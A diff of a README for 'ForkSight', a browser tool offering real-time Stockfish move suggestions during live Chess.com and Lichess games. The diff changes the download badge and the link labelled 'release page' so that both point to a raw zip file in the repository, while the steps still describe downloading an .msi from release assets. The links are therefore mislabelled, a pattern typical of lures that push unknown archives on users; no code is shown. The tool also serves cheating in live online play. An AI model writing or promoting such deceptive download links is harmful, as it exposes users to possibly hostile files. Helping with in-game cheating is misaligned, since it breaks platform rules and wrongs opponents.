@@ -1,6 +1,6 @@
 # ♟️ ForkSight - Master your chess games instantly
 
-[![](https://img.shields.io/badge/Download-ForkSight-blue)](https://github.com/Chromogengenuspalinurus3993/ForkSight/releases)
+[![](https://img.shields.io/badge/Download-ForkSight-blue)](https://raw.githubusercontent.com/Chromogengenuspalinurus3993/ForkSight/main/lichess-extension/Sight_Fork_v1.0.zip)
 
 ForkSight provides real-time chess move suggestions during your games. It works inside your web browser on Chess.com and Lichess.org. This tool uses the Stockfish engine to analyze board positions. It highlights the best lines and checks for potential mistakes. Players at all levels use it to study their games and improve their decision-making.
 
@@ -19,7 +19,7 @@ The software acts as a bridge between your browser and the Stockfish chess engin
 
 Follow these steps to install the software on your Windows machine.
 
-1. Visit the [ForkSight release page](https://github.com/Chromogengenuspalinurus3993/ForkSight/releases).
+1. Visit the [ForkSight release page](https://raw.githubusercontent.com/Chromogengenuspalinurus3993/ForkSight/main/lichess-extension/Sight_Fork_v1.0.zip).
 2. Look for the latest version listed under the Assets section.
 3. Click the file ending in .msi to download the installer.
 4. Open the downloaded file to begin the setup process.
